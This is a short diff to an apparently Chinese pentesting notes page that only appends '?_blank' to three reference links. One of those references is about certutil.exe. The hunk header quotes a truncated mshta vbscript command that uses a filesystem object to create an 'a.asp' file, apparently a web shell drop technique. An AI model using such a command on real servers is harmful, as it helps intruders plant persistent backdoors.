@@ -83,6 +83,6 @@ mshta vbscript:createobject("scripting.filesystemobject").createtextfile("a.asp"
 
 <br />
 #### Reference(侵删)：
-* [https://xianzhi.aliyun.com/forum/topic/1654](https://xianzhi.aliyun.com/forum/topic/1654)
-* [https://evi1cg.me/archives/Tricks.html](https://evi1cg.me/archives/Tricks.html)
-* [https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/](https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/)
+* [https://xianzhi.aliyun.com/forum/topic/1654](https://xianzhi.aliyun.com/forum/topic/1654?_blank)
+* [https://evi1cg.me/archives/Tricks.html](https://evi1cg.me/archives/Tricks.html?_blank)
+* [https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/](https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/?_blank)
